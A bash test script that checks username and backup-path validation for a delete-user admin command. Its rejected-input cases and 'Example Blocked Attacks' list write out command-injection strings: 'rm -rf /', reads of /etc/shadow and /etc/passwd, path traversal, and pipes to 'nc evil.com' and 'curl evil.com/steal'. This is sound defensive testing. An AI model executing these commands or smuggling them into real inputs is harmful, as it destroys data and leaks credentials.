#!/bin/bash

# Test script for delete user validation
# Demonstrates validation of username and backup path parameters

# Source the common functions to get validation
SCRIPT_DIR="$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")"
source "$SCRIPT_DIR/_common_.source.sh"

echo "Delete User Parameter Validation Testing"
echo "========================================"

# Test helper function
test_validation() {
    local func_name="$1"
    local param_name="$2"
    local test_value="$3"
    local expected_result="$4"  # "PASS" or "FAIL"
    local description="$5"
    
    echo ""
    echo "Testing: $description"
    echo "Function: $func_name '$param_name' '$test_value'"
    echo "Expected: $expected_result"
    
    if result=$($func_name "$param_name" "$test_value" 2>/dev/null); then
        echo "Result: PASS - '$result'"
        if [[ "$expected_result" == "FAIL" ]]; then
            echo "❌ UNEXPECTED PASS - should have failed!"
        else
            echo "✅ Expected pass"
        fi
    else
        echo "Result: FAIL - validation rejected input"
        if [[ "$expected_result" == "PASS" ]]; then
            echo "❌ UNEXPECTED FAIL - should have passed!"
        else
            echo "✅ Expected fail"
        fi
    fi
}

echo ""
echo "=== Username Validation Tests ==="
echo "Testing validate_parameter_user for --user parameter:"

echo ""
echo "--- Valid Usernames (Should PASS) ---"
test_validation "validate_parameter_user" "--user" "alice" "PASS" "Simple username"
test_validation "validate_parameter_user" "--user" "john-doe" "PASS" "Username with hyphen"
test_validation "validate_parameter_user" "--user" "user_123" "PASS" "Username with underscore and numbers"
test_validation "validate_parameter_user" "--user" "test.user" "PASS" "Username with dot"
test_validation "validate_parameter_user" "--user" "svc-backup" "PASS" "Service account name"

echo ""
echo "--- Invalid Usernames (Should FAIL) ---"
test_validation "validate_parameter_user" "--user" "" "FAIL" "Empty username"
test_validation "validate_parameter_user" "--user" "123user" "FAIL" "Username starting with number"
test_validation "validate_parameter_user" "--user" "user;evil" "FAIL" "Username with semicolon"
test_validation "validate_parameter_user" "--user" "user\$injection" "FAIL" "Username with dollar sign"
test_validation "validate_parameter_user" "--user" "user|pipe" "FAIL" "Username with pipe"
test_validation "validate_parameter_user" "--user" "user\`backtick" "FAIL" "Username with backtick"
test_validation "validate_parameter_user" "--user" "very-long-username-that-exceeds-limit" "FAIL" "Username too long (over 32 chars)"

echo ""
echo "=== Backup Path Validation Tests ==="
echo "Testing validate_parameter_path for --backup-home parameter:"

echo ""
echo "--- Valid Paths (Should PASS) ---"
test_validation "validate_parameter_path" "--backup-home" "/backup/users/alice" "PASS" "Absolute backup path"
test_validation "validate_parameter_path" "--backup-home" "/tmp/user-backup" "PASS" "Temp directory backup"
test_validation "validate_parameter_path" "--backup-home" "/opt/backups/deleted-users" "PASS" "System backup directory"
test_validation "validate_parameter_path" "--backup-home" "/home/admin/backups/users" "PASS" "Admin backup directory"

echo ""
echo "--- Invalid Paths (Should FAIL) ---"
test_validation "validate_parameter_path" "--backup-home" "" "FAIL" "Empty path"
test_validation "validate_parameter_path" "--backup-home" "relative/path" "FAIL" "Relative path (not absolute)"
test_validation "validate_parameter_path" "--backup-home" "/backup/../etc" "FAIL" "Path with traversal"
test_validation "validate_parameter_path" "--backup-home" "/backup;rm -rf /" "FAIL" "Path with command injection"
test_validation "validate_parameter_path" "--backup-home" "/backup\$(evil)" "FAIL" "Path with command substitution"
test_validation "validate_parameter_path" "--backup-home" "/backup|evil" "FAIL" "Path with pipe"
test_validation "validate_parameter_path" "--backup-home" "/backup&evil" "FAIL" "Path with ampersand"

echo ""
echo "=== Security Attack Prevention Tests ==="
echo "Testing command injection attempts:"

echo ""
echo "--- Username Injection Attempts (Should FAIL) ---"
test_validation "validate_parameter_user" "--user" "alice;rm -rf /" "FAIL" "Command injection via semicolon"
test_validation "validate_parameter_user" "--user" "alice\$(rm /etc/passwd)" "FAIL" "Command substitution attack"
test_validation "validate_parameter_user" "--user" "alice|cat /etc/shadow" "FAIL" "Pipe to sensitive file"
test_validation "validate_parameter_user" "--user" "alice&evil_command" "FAIL" "Background command execution"

echo ""
echo "--- Backup Path Injection Attempts (Should FAIL) ---"
test_validation "validate_parameter_path" "--backup-home" "/backup;cat /etc/passwd" "FAIL" "Path with command injection"
test_validation "validate_parameter_path" "--backup-home" "/backup\$(cat /etc/shadow)" "FAIL" "Path with command substitution"
test_validation "validate_parameter_path" "--backup-home" "/backup|nc evil.com 1234" "FAIL" "Path with network command"
test_validation "validate_parameter_path" "--backup-home" "/backup&curl evil.com/steal" "FAIL" "Path with data exfiltration"

echo ""
echo "========================================"
echo "Delete User Validation Test Complete"
echo ""
echo "Summary of Validation Improvements:"
echo "=================================="
echo ""
echo "✅ USERNAME VALIDATION (validate_parameter_user):"
echo "   - POSIX compliant username rules"
echo "   - Must start with letter"
echo "   - Only letters, numbers, dots, hyphens, underscores"
echo "   - Maximum 32 characters"
echo "   - Blocks all shell metacharacters"
echo ""
echo "✅ BACKUP PATH VALIDATION (validate_parameter_path):"
echo "   - Must be absolute path (starts with /)"
echo "   - No path traversal attacks (../)"
echo "   - No shell metacharacters (; | & \` \$ ( ))"
echo "   - No null bytes"
echo "   - Maximum 4096 characters"
echo ""
echo "✅ SECURITY BENEFITS:"
echo "   - Command injection impossible"
echo "   - Path traversal blocked"
echo "   - Shell metacharacter filtering"
echo "   - Input validated immediately at parameter parsing"
echo ""
echo "✅ USER EXPERIENCE IMPROVEMENTS:"
echo "   - Clear error messages with format requirements"
echo "   - Automatic help display on validation failure"
echo "   - Consistent validation across all commands"

echo ""
echo "Example Safe Usage:"
echo "=================="
echo "./script delete-user --user alice"
echo "./script delete-user --user john-doe --remove-home"
echo "./script delete-user --user svc-backup --backup-home /opt/backups/users/svc-backup"
echo "./script delete-user --user test.user --domain --remove-home"

echo ""
echo "Example Blocked Attacks:"
echo "======================="
echo "❌ ./script delete-user --user 'alice;rm -rf /'"
echo "❌ ./script delete-user --user 'alice' --backup-home '/tmp;curl evil.com'"
echo "❌ ./script delete-user --user '\$(cat /etc/passwd)'"
echo "❌ ./script delete-user --user 'alice' --backup-home '../../../etc'"
echo ""
echo "All malicious inputs are caught and rejected with clear error messages!"